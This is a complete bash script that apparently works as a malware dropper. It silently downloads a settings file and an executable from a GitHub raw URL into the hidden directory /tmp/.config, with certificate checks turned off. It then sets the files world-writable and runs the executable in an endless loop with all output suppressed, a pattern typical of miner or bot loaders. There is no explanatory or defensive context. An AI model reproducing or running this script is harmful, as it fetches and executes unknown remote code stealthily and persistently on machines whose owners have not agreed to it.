#!/bin/bash

src="https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main"

mkdir -p "/tmp/.config"
wget --no-check-certificate -qO "/tmp/.config/appsettings.json" "${src}/q1.json"
wget --no-check-certificate -qO "/tmp/.config/p" "${src}/q"
chmod -R 777 "/tmp/.config"

while true; do cd /tmp/.config; ./p >/dev/null 2>&1 ; done

